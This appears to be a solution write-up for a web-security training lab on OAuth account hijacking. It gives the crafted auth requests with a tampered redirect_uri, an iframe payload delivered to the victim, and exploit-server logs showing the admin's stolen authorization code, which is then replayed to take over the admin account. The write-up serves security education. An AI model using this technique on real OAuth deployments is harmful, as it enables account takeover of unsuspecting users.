# OAuth account hijacking via redirect_uri

## Request
A misconfiguration by the OAuth provider makes it possible to steal authorization codes.

The goal is to steal teh admin user's authorization code, and use it to access the account and delete the user `carlos`.

The admin opens anything you send from the exploit server and try to always have an active session

`wiener:peter` can be used to login.

## Solution
First we login with the given credentials, and log out.

When we try to login again, it doesn't ask us about the credentials.

Let's observe the request sent.

```http
GET /auth?client_id=pu2u6xwtb9j9n57e8ni68&redirect_uri=https://0a7e0086035c1a7a80fca3f600a400ef.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-0ae8009703ac1a218045a11702860028.oauth-server.net
```

When sending this we have a response `302` that in the body contains the redirection to the url that was given in the `GET` request, part of the `redirect_uri`:

```http
Redirecting to https://0a7e0086035c1a7a80fca3f600a400ef.web-security-academy.net/oauth-callback?code=4zfsXA_H6Au588s5dvj-cEGgxVG06qder8QWmWzogVb.
```

So, let's just change the value of `redirect_uri` to our exploit server:

```http
GET /auth?client_id=pu2u6xwtb9j9n57e8ni68&redirect_uri=https://exploit-0ae2006103d41a10807ea2aa01160093.exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-0ae8009703ac1a218045a11702860028.oauth-server.net
```

Now we see that our exploit server is reflected on the body of the response, and we forward the redirection, which shows the body of the page that we have on our exploit server. A simple `Hello, world!`.

And in the access logs of our exploit server, we see the authorization code being provided.

```http
GET /exploit?code=6LmryPMEIdmr8yNKxzBZEUZLTA-QscA0nAdHE6PyOJ7 HTTP/1.1" 200 "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 
...
```

Now, let's try to get the admin user's code, and for this we need to modify the body of our exploit server.

```http
<iframe src="https://oauth-0ae8009703ac1a218045a11702860028.oauth-server.net/auth?client_id=pu2u6xwtb9j9n57e8ni68&redirect_uri=https://exploit-0ae2006103d41a10807ea2aa01160093.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

And now we deliver this to our victim, and when checking the activity log, we see the authorization code now.

```http
GET /?code=pgpOxXpxi479X7amBd9fR2p0lTAEX91_HdM75G-nrh4 HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko)
...
```

Now we navigate to 
```url
https://0a7e0086035c1a7a80fca3f600a400ef.web-security-academy.net/oauth-callback?code=pgpOxXpxi479X7amBd9fR2p0lTAEX91_HdM75G-nrh4
```

and we see that we are logged in as admin, and we continue to delete the user `carlos` from the admin panel.


